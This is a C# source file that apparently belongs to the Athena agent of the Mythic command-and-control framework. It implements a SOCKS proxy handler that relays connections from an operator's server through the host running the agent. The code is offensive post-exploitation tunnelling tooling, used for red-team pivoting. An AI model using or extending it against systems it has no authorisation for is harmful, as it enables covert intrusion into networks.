using Athena.Models.Athena.Socks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;

namespace Athena.Commands.Model
{    

    public class SocksHandler
    {
        private CancellationTokenSource ct { get; set; }
        private Dictionary<int, SocksConnection> connections { get; set; }
        private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
        public bool running { get; set; }
        static object _lock = new object();
        static object _dictLock = new object();
        
        public SocksHandler()
        {
            this.running = false;
            this.connections = new Dictionary<int, SocksConnection>();
        }

        /// <summary>
        /// Start the SOCKS Listener
        /// </summary>
        public bool Start()
        {
            this.ct = new CancellationTokenSource();
            this.connections = new Dictionary<int, SocksConnection>();
            this.messagesOut = new ConcurrentBag<SocksMessage>();

            List<int> idsToRemove = new List<int>();

            Task.Run(() =>
            {
                while (!this.ct.IsCancellationRequested)
                {
                    //Get a new list so we don't have to worry about modifications while we loop
                    //List<SocksConnection> conns = new List<SocksConnection>(this.connections.Values);
                    List<SocksConnection> conns = new List<SocksConnection>();
                    if (Monitor.TryEnter(_dictLock, 5000))
                    {
                        try 
                        {
                            conns = new List<SocksConnection>(this.connections.Values);
                            Monitor.Exit(_dictLock);
                        }
                        catch (Exception e)
                        {
                            Misc.WriteDebug(e.Message);
                        }
                    }

                    foreach (SocksConnection connection in conns)
                    {
                        try
                        {
                            if (!connection.IsSocketDisposed)
                            {
                                if (connection.Socket.Available > 0)
                                {
                                    byte[] buf = new byte[connection.Socket.Available];
                                    connection.Receive(buf);
                                }
                            }

                            if (connection.exited)
                            {
                                idsToRemove.Add(connection.server_id);
                            }
                        }
                        catch (Exception e)
                        {
                            Misc.WriteError(e.Message);
                        }
                    }

                    //Quick cleanup
                    foreach (int id in idsToRemove)
                    {
                        RemoveConnection(id);
                    }
                }
            });
            return true;
        }

        /// <summary>
        /// Stops the SOCKS Listener
        /// </summary>
        public bool Stop()
        {
            try
            {
                if (!this.running)
                {
                    return true;
                }

                this.running = false;
                
                if (this.ct is not null)
                {
                    this.ct.Cancel();
                }
                
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return false;
            }
        }
        
        /// <summary>
        /// Add a connection to the tracker dictionary
        /// </summary>
        /// <param name="conn">Socks Connection</param>
        private bool AddConnection(SocksConnection conn)
        {
            if (Monitor.TryEnter(_dictLock, 5000))
            {
                this.connections.Add(conn.server_id, conn);
                Monitor.Exit(_dictLock);
                return true;
            }
            return false;
        }

        /// <summary>
        /// Remove connection from the tracker dictionary
        /// </summary>
        /// <param name="conn">Connection ID</param>
        private bool RemoveConnection(int conn)
        {
            if (Monitor.TryEnter(_dictLock, 5000))
            {
                this.connections.Remove(conn);
                Monitor.Exit(_dictLock);
                return true;
            }
            else
            {
                Misc.WriteDebug("Failed to removed: " + conn);
            }
            return false;
        }

        /// <summary>
        /// Get messages from the out dictionary to forward to the Mythic server
        /// </summary>
        public List<SocksMessage> GetMessages()
        {
            if(this.messagesOut.Count < 1)
            {
                return new List<SocksMessage>();
            }

            List<SocksMessage> msgOut;

            lock (_lock)
            {
                msgOut = new List<SocksMessage>(this.messagesOut);
                this.messagesOut.Clear();
            }
            msgOut.Reverse();
            return msgOut;
        }

        /// <summary>
        /// Return the number of messages available to return to the Mythic server
        /// </summary>
        public int Count()
        {
            return this.messagesOut.Count();
        }

        /// <summary>
        /// Handle a new message forwarded from the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public void HandleMessage(SocksMessage sm)
        {
            if (this.connections.ContainsKey(sm.server_id))
            {
                try
                { 
                    if (!string.IsNullOrEmpty(sm.data))
                    {
                        this.connections[sm.server_id].Send(Misc.Base64DecodeToByteArray(sm.data)).ToString();
                    }

                    if (sm.exit)
                    {
                        this.connections[sm.server_id].exited = true;
                    }

                }
                catch (Exception e)
                {
                    Misc.WriteError(e.Message);
                }
            }
            else
            {
                HandleNewConnection(sm);
            }
        }

        /// <summary>
        /// Handle a new connection forwarded from the Mythic server
        /// </summary>
        /// <param name="address">IP address</param>
        /// <param name="sm">Socks Message</param>
        private void HandleNewConnection(SocksMessage sm)
        {
            try
            {
                if (String.IsNullOrEmpty(sm.data))
                {
                    return;
                }

                ConnectionOptions co = new ConnectionOptions(sm);
                SocksConnection sc = new SocksConnection(co);
                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                };
                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id
                };
                if (sc.Connect())
                {
                    //Add connection to tracker

                    while (!AddConnection(sc)) { }
                    cr.status = ConnectResponseStatus.Success;
                    smOut.exit = false;
                    //Add to our message queue
                }
                else
                {
                    cr.status = ConnectResponseStatus.GeneralFailure;
                    smOut.exit = true;
                }
                cr.addrtype = co.addressType;

                //Put our ConnectResponse into the SocksMessage
                smOut.data = Misc.Base64Encode(cr.ToByte());
                //Return message
                ReturnMessage(smOut);
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                ConnectResponse cr = new ConnectResponse()
                {
                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
                    bndport = new byte[] { 0x00, 0x00 },
                    status = ConnectResponseStatus.GeneralFailure,
                };

                SocksMessage smOut = new SocksMessage()
                {
                    server_id = sm.server_id,
                    exit = true,
                    data = Misc.Base64Encode(cr.ToByte())
                };
            }
        }

        /// <summary>
        /// Add a message to the out queue to be returned to the Mythic server
        /// </summary>
        /// <param name="sm">Socks Message</param>
        public void ReturnMessage(SocksMessage sm)
        {
            if (Monitor.TryEnter(_lock, 5000))
            {
                this.messagesOut.Add(sm);
                Monitor.Exit(_lock);
            }
            if (sm.exit)
            {
                this.connections[sm.server_id].exited = true;
            }
        }
    }
}
